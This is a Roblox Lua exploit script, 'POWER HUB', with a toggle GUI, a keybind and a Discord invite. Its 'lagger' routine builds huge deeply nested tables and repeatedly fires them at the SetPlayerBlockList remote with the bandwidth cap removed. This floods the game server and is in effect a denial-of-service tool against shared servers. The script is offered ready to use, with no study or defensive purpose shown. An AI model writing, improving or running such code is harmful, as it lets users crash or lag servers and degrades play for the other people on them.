if not script_key then
    game:GetService("Players").LocalPlayer:Kick("❌ Error: Missing script_key!")
    return
end 
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

-- Optimization
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end

-- ==================================================================================
-- REDESIGNED UI (WHITE & RED THEME)
-- ==================================================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "POWER HUB⚡️"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 240, 0, 115)
MainFrame.Position = UDim2.new(0.5, -120, 0.5, -57)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Byad (White)
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Border Hmar
local MainStroke = Instance.new("UIStroke")
MainStroke.Thickness = 1.5
MainStroke.Color = Color3.fromRGB(220, 20, 60) -- Hmar (Crimson/Red)
MainStroke.Parent = MainFrame

-- ===== TOP HEADER =====
local HeaderFrame = Instance.new("Frame")
HeaderFrame.Size = UDim2.new(1, -12, 0, 26)
HeaderFrame.Position = UDim2.new(0, 6, 0, 6)
HeaderFrame.BackgroundTransparency = 1
HeaderFrame.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Text = "POWER HUB⚡️"
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20) -- Text kahl/dark bach yban 3la lbyad
TitleLabel.TextSize = 13
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.Size = UDim2.new(0, 150, 0, 20)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = HeaderFrame

-- Close Button ("X")
local CloseBtn = Instance.new("TextButton")
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextColor3 = Color3.fromRGB(220, 20, 60)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Size = UDim2.new(0, 20, 0, 20)
CloseBtn.Position = UDim2.new(1, -20, 0, 0)
CloseBtn.Parent = HeaderFrame

CloseBtn.MouseButton1Click:Connect(function()
    stopLaggerLoop()
    ScreenGui:Destroy()
end)

-- Minimize Button ("-")
local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Text = "-"
MinimizeBtn.Font = Enum.Font.GothamBold
MinimizeBtn.TextColor3 = Color3.fromRGB(220, 20, 60)
MinimizeBtn.BackgroundTransparency = 1
MinimizeBtn.Size = UDim2.new(0, 20, 0, 20)
MinimizeBtn.Position = UDim2.new(1, -44, 0, 0)
MinimizeBtn.Parent = HeaderFrame

-- ===== CONTROL BAR =====
local ControlFrame = Instance.new("Frame")
ControlFrame.Size = UDim2.new(1, -12, 0, 32)
ControlFrame.Position = UDim2.new(0, 6, 0, 34)
ControlFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
ControlFrame.BackgroundTransparency = 0.2
ControlFrame.Parent = MainFrame

local ControlCorner = Instance.new("UICorner")
ControlCorner.CornerRadius = UDim.new(0, 6)
ControlCorner.Parent = ControlFrame

-- Keybind Button
local KeybindBtn = Instance.new("TextButton")
KeybindBtn.Text = "V"
KeybindBtn.Font = Enum.Font.GothamBold
KeybindBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
KeybindBtn.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
KeybindBtn.Size = UDim2.new(0, 30, 0, 24)
KeybindBtn.Position = UDim2.new(0, 5, 0.5, -12)
KeybindBtn.Parent = ControlFrame

local KCorner = Instance.new("UICorner")
KCorner.CornerRadius = UDim.new(0, 4)
KCorner.Parent = KeybindBtn

-- Toggle Label
local ToggleLabel = Instance.new("TextLabel")
ToggleLabel.Text = "POWER HUB: OFF"
ToggleLabel.Font = Enum.Font.GothamBold
ToggleLabel.TextColor3 = Color3.fromRGB(220, 20, 60) -- Hmar
ToggleLabel.TextSize = 11
ToggleLabel.BackgroundTransparency = 1
ToggleLabel.Position = UDim2.new(0, 40, 0.5, -10)
ToggleLabel.Size = UDim2.new(0, 115, 0, 20)
ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
ToggleLabel.Parent = ControlFrame

-- Switch Background
local SwitchBg = Instance.new("Frame")
SwitchBg.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
SwitchBg.Size = UDim2.new(0, 28, 0, 16)
SwitchBg.Position = UDim2.new(1, -34, 0.5, -8)
SwitchBg.Parent = ControlFrame

local SWCorner = Instance.new("UICorner")
SWCorner.CornerRadius = UDim.new(1, 0)
SWCorner.Parent = SwitchBg

local SwitchKnob = Instance.new("Frame")
SwitchKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SwitchKnob.Size = UDim2.new(0, 10, 0, 10)
SwitchKnob.Position = UDim2.new(0, 3, 0.5, -5)
SwitchKnob.Parent = SwitchBg

local SKCorner = Instance.new("UICorner")
SKCorner.CornerRadius = UDim.new(1, 0)
SKCorner.Parent = SwitchKnob

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Text = ""
ToggleBtn.BackgroundTransparency = 1
ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
ToggleBtn.Parent = ControlFrame

-- Toggle Logic
local function setToggle(state)
    laggerEnabled = state
    local goal = state and UDim2.new(1, -15, 0.5, -5) or UDim2.new(0, 3, 0.5, -5)
    local bgColor = state and Color3.fromRGB(220, 20, 60) or Color3.fromRGB(200, 200, 200) -- Hmar ila kan ON
    local knobColor = Color3.fromRGB(255, 255, 255)
    
    TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal, BackgroundColor3 = knobColor}):Play()
    TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = bgColor}):Play()
    
    ToggleLabel.Text = state and "POWER HUB: ON" or "POWER HUB: OFF"

    if state then
        startLagger()
    else
        stopLaggerLoop()
    end
end

ToggleBtn.MouseButton1Click:Connect(function()
    setToggle(not laggerEnabled)
end)

-- ===== DISCORD LINK FOOTER =====
local DiscordLabel = Instance.new("TextButton")
DiscordLabel.Text = "discord.gg/wtPVE59xHa"
DiscordLabel.Font = Enum.Font.Gotham
DiscordLabel.TextColor3 = Color3.fromRGB(220, 20, 60) -- Hmar
DiscordLabel.TextSize = 10
DiscordLabel.BackgroundTransparency = 1
DiscordLabel.Size = UDim2.new(1, -12, 0, 20)
DiscordLabel.Position = UDim2.new(0, 6, 1, -24)
DiscordLabel.Parent = MainFrame

DiscordLabel.MouseButton1Click:Connect(function()
    pcall(function()
        if setclipboard then
            setclipboard("https://discord.gg/wtPVE59xHa")
            DiscordLabel.Text = "Copied to Clipboard! ✓"
            task.wait(1.5)
            DiscordLabel.Text = "discord.gg/wtPVE59xHa"
        end
    end)
end)

-- =========================================================================
-- MINIMIZE LOGIC
-- =========================================================================
local isMinimized = false
local originalSize = UDim2.new(0, 240, 0, 115)
local minimizedSize = UDim2.new(0, 240, 0, 28)

MinimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    MinimizeBtn.Text = isMinimized and "+" or "-"
    ControlFrame.Visible = not isMinimized
    DiscordLabel.Visible = not isMinimized

    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = isMinimized and minimizedSize or originalSize
    }):Play()
end)

-- =========================================================================
-- BULLETPROOF KEYBIND LOGIC 
-- =========================================================================
local boundKey = Enum.KeyCode.V
local listeningForKey = false
local listenTimeout = nil
local keyDown = false

KeybindBtn.MouseButton1Click:Connect(function()
    if listenTimeout then task.cancel(listenTimeout) end
    listeningForKey = true
    KeybindBtn.Text = "..."
    
    listenTimeout = task.delay(5, function()
        if listeningForKey then
            listeningForKey = false
            KeybindBtn.Text = tostring(boundKey):gsub("Enum.KeyCode.", "")
        end
    end)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end

    if listeningForKey then
        boundKey = input.KeyCode
        local keyName = tostring(boundKey):gsub("Enum.KeyCode.", "")
        KeybindBtn.Text = keyName
        listeningForKey = false
        if listenTimeout then 
            task.cancel(listenTimeout)
            listenTimeout = nil
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if boundKey and UserInputService:IsKeyDown(boundKey) then
        if not keyDown then
            keyDown = true
            setToggle(not laggerEnabled)
        end
    else
        keyDown = false
    end
end)

-- =========================================================================
-- DRAGGING LOGIC
-- =========================================================================
local dragging = false
local dragStart = nil
local startPos = nil

MainFrame.InputBegan:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        MainFrame.Position = newPos
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
